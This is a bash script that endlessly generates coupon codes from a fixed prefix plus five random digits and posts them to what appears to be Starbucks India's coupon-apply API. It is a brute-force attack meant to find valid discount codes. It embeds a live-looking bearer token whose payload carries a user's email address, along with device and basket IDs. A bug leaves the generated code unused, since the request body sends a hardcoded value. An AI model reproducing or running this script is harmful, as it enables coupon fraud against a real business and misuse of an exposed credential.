#!/bin/bash

# Function to generate a random numeric string of a specified length
generate_random_numeric_string() {
    local length=$1
    LC_ALL=C tr -dc '0-9' < /dev/urandom | fold -w $length | head -n 1
}

# Ensure the locale is set correctly to avoid tr command issues
export LC_ALL=C

# Define the fixed prefix
fixed_prefix="ZM34232"

# Define the target URL
target_url='https://tsb-mbaas.starbucksindia.net/api/order/cart/coupon/v4/apply'

# Function to send API request with given coupon code
send_coupon_request() {
    local coupon_code=$1
    local response=$(curl -s "$target_url" -X POST \
      -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0' \
      -H 'Accept: application/json, text/plain, */*' \
      -H 'Accept-Language: EN' \
      -H 'Accept-Encoding: gzip, deflate, br, zstd' \
      -H 'Content-Type: application/json' \
      -H 'Referer: https://www.starbucks.in/' \
      -H 'Device-Meta-Info: {"appVersion":"5.0.4","deviceCountry":"India","deviceCity":"","deviceId":"10ff66df-fa99-43e8-a6c3-b3b6579df0f8","deviceModel":"","platform":"WEB","deviceOSVersion":""}' \
      -H 'Origin: https://www.starbucks.in' \
      -H 'Sec-Fetch-Dest: empty' \
      -H 'Sec-Fetch-Mode: cors' \
      -H 'Sec-Fetch-Site: cross-site' \
      -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJFZW1hemo0V1pfZFRUVkN1VGdzc19LQlAwY0R3R0FOZUpqaXRRMWxQWW1VIn0.eyJleHAiOjE3MTY3ODkwNjMsImlhdCI6MTcxNjcwMjY2MywianRpIjoiOWE0Y2ZkNmMtMzM1NC00ODVjLTg5MjctZWYwODM2N2ZmZWZjIiwiaXNzIjoiaHR0cDovL3RzYi1rZXljbG9hazo4MDgwL3JlYWxtcy90c2IiLCJhdWQiOiJhY2NvdW50Iiwic3ViIjoiOWY3OTlmNjgtOWZkOS00ZmU2LWI4MzEtYzYzN2YxNTMwMDRhIiwidHlwIjoiQmVhcmVyIiwiYXpwIjoidHNiX3BvcnRhbF9hcHAiLCJzZXNzaW9uX3N0YXRlIjoiNDZmMzVkZTctNjEyNC00MDI3LWE0MWUtYTkwYTMwMmNlNTA4IiwiYWNyIjoiMSIsInJlYWxtX2FjY2VzcyI6eyJyb2xlcyI6WyJvZmZsaW5lX2FjY2VzcyIsInVtYV9hdXRob3JpemF0aW9uIiwiZGVmYXVsdC1yb2xlcy10c2IiXX0sInJlc291cmNlX2FjY2VzcyI6eyJhY2NvdW50Ijp7InJvbGVzIjpbIm1hbmFnZS1hY2NvdW50IiwibWFuYWdlLWFjY291bnQtbGlua3MiLCJ2aWV3LXByb2ZpbGUiXX19LCJzY29wZSI6Im9wZW5pZCBlbWFpbCBwcm9maWxlIiwic2lkIjoiNDZmMzVkZTctNjEyNC00MDI3LWE0MWUtYTkwYTMwMmNlNTA4IiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJzdXJ5YXRlY2h6b29AZ21haWwuY29tIn0.UsGnE727d-n1FswPPtE8OPLE_XW0QtDZ6RCsOCKYR1l8xVXr3e5XTs4sICtxJZRU9aFb2irbU9PC_2vqxgF8WNhnOPiXysZo1rotxwgjOB9MBkRVc9waB9SWbN6U4arvwqL7V-s6wnwCQg2ktgDglAW0Rsrc66TPiZhS5cZG-qr49Re178L_rMqTfjrP3-adXXz225CennXpwKcx_ib6FHMDQB1H51n9w1KIq6phNUd52v0IN7R0bBy08pz_Asi55s7LVQoQW-KaqcTGeJoATd1Ptc8HNFhTJKjM6t78ERJIma8XfcfMkD6hz4e85XLQcqkaiOJej_1oHw0VuhtDpg' \
      --data-raw '{"basketId":"ae05811c-a79e-4837-a4fd-59717451713b","couponCode":"TbGAlw7zf70N9RKexQ0iJQ=="}')
    echo "Response: $response"
}

# Main loop to continuously generate and send coupon codes
while true; do
    # Generate the random numeric part of the coupon code (5 digits)
    random_numeric_part=$(generate_random_numeric_string 5)
    coupon_code="${fixed_prefix}${random_numeric_part}"

    # Encode the coupon code in base64, ensuring padding
    base64_coupon_code=$(echo -n "$coupon_code" | base64)

    # Log the coupon code being sent
    echo "Sending coupon code: $coupon_code (Base64: $base64_coupon_code)"

    # Send API request with the given coupon code
    send_coupon_request "$base64_coupon_code"
done
